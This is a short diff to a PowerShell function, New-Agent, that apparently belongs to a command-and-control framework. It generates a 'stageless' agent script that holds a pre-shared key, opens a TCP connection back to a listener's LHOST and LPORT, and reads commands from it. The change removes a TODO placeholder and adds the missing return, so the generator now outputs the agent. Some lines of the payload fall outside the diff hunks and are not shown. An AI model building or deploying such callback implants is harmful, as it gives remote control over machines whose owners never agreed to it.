@@ -7,7 +7,7 @@ Function Global:New-Agent()
     param
     (
 		[Parameter()]
-		[String]$Listerner,
+		[PSCustomObject]$Listerner,
 
 		[Parameter()]
 		[ValidateSet("Staged","Stageless")]
@@ -27,12 +27,11 @@ Function Global:New-Agent()
 
 		if($StageType -eq "Stageless")
 		{
-				$PSK   = ($Listerner.PSK)
+				$PSK   = $Listerner.PSK
 				$LHOST = $Listerner.LHOST
-				$LPORT =  $Listerner.LPORT
+				$LPORT = $Listerner.LPORT
 
 				$Agent = @(
-					"TODO:::::"
 					"`$PSK = $PSK"
 					"`$tcp = New-Object System.Net.Sockets.TcpClient;" 
 					"`$tcp.connect($LHOST, $LPORT);"
@@ -44,8 +43,7 @@ Function Global:New-Agent()
 					"`$reader.ReadLine()"
 					) -join "`r`n"
 			
-
-			
+			return $Agent
 		}
 		
 	}
